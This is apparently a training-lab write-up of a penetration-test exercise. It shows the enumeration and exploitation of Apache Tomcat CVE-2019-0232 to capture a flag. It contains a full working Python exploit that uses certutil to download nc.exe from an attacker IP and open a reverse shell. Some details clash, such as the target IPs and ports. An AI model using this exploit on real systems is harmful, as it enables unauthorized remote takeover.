# Penetration Test for Inlanefreight: Attacking Common Applications

## Introduction
Inlanefreight, a company focused on logistics, presents a robust security posture with a well-hardened network. During the penetration test, after performing thorough enumeration, I encountered a host of particular interest that could potentially be leveraged to gain an initial foothold into the network. The goal of this portion of the skills assessment was to identify vulnerable applications running on the target host, exploit any weaknesses found, and gain access to the flag.txt file to complete the challenge.

## Enumerating the Target Host
The first step in any penetration test is to enumerate the target system and identify any potential vulnerabilities or weak points in its security. Given that the network was well-secured, I employed various enumeration techniques to gather information on the target host:

**1. Network Scanning:**
I performed a network scan using tools such as Nmap to identify open ports and services running on the target machine. The goal was to gather information on potential vulnerable applications that could be exploited.
```bash
nmap -sS -T4 -p- 10.129.233.221
```

This Nmap scan revealed several open ports, including ports for HTTP (80), HTTPS (443), and SSH (22). The presence of an HTTP/HTTPS service indicated a web application that could potentially be vulnerable to common web application flaws.

**2. Service Version Detection:**

To gather more specific information about the services running on the target, I performed service version detection to identify the exact versions of the software. This was done using the following Nmap command:
```bash
nmap -sV 10.129.233.221
```
The scan showed that the target was running Apache Tomcat 9.0.0.M1 on port 8080, which is a well-known application server that may have potential vulnerabilities, including the CVE-2019-0232 remote code execution vulnerability.

## Identifying Vulnerable Applications
During the enumeration phase, I focused on identifying any applications or services that might be vulnerable to known exploits. One such service was Apache Tomcat, which was running version 9.0.0.M1. After researching this version, I found that it was vulnerable to CVE-2019-0232, a remote code execution vulnerability in Tomcat's CGI scripts on Windows systems.

This vulnerability can be exploited by sending crafted HTTP requests to the Tomcat server that invoke the cmd.bat script, allowing an attacker to execute arbitrary commands on the server. With this in mind, I began the exploitation process.

Exploiting Apache Tomcat CVE-2019-0232
To exploit the vulnerability in Apache Tomcat, I used a custom Python script that leverages the certutil tool to download and execute Netcat on the target machine. This allows the attacker to obtain a reverse shell and gain control of the system.

Below is the script I used for exploitation:
```bash
#!/usr/bin/env python3
import time
import requests

# Configuration
host = '10.10.10.15'  # Target host
port = '8080'         # Port on which Tomcat is running
server_ip = '10.10.14.64'  # IP of the attacker server hosting nc.exe
server_port = '80'    # Port where nc.exe is hosted
nc_ip = '10.10.14.64' # IP for reverse shell listener
nc_port = '1234'      # Port for reverse shell listener

# Construct the malicious payload URLs
url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"

# Send requests to exploit the vulnerability
try:
    print("[*] Sending request to download nc.exe...")
    requests.get("http://" + url1)  # Trigger the download of nc.exe using certutil
    time.sleep(2)  # Wait for a short time to ensure the download completes
    print("[*] Sending request to execute reverse shell...")
    requests.get("http://" + url2)  # Execute the reverse shell payload
    print("[+] Reverse shell payload executed successfully.")
except Exception as e:
    print(f"Some error occurred: {str(e)}")
```
**Explanation of the Script:**

**Payload URL 1**: This URL triggers the cmd.bat script on the Tomcat server and uses certutil to download Netcat (nc.exe) from the attacker's server.

**Payload URL 2**: This second URL executes the downloaded Netcat and establishes a reverse shell back to the attacker's machine on port 1234.

## Setting Up the Listener
Before running the exploit script, I set up a Netcat listener on my local machine to receive the reverse shell connection:
```bash
nc -lvnp 1234
```
Once the script successfully executed the reverse shell payload, a connection was established to my listener, granting me access to the target machine.

## Gaining Access and Retrieving the Flag
With the reverse shell established, I was able to navigate the system's file structure. The goal was to find the flag.txt file, which was located on the Administrator's desktop. Using the following command, I accessed the file:
```bash
cat C:\Users\Administrator\Desktop\flag.txt
```
The contents of the `flag.txt` file were successfully retrieved and submitted to complete the assessment.

## Conclusion
This penetration test demonstrated how an attacker could exploit a vulnerability in Apache Tomcat to gain unauthorized access to a system. By identifying the CVE-2019-0232 vulnerability in the target's Tomcat instance, I was able to leverage a custom script to execute arbitrary commands and gain a reverse shell. Once access was obtained, I was able to retrieve the flag.txt file and complete the skills assessment.

The process highlights the importance of keeping web application servers like Apache Tomcat up to date with security patches, as well as securing services from unauthorized access by applying the principle of least privilege and isolating sensitive systems.



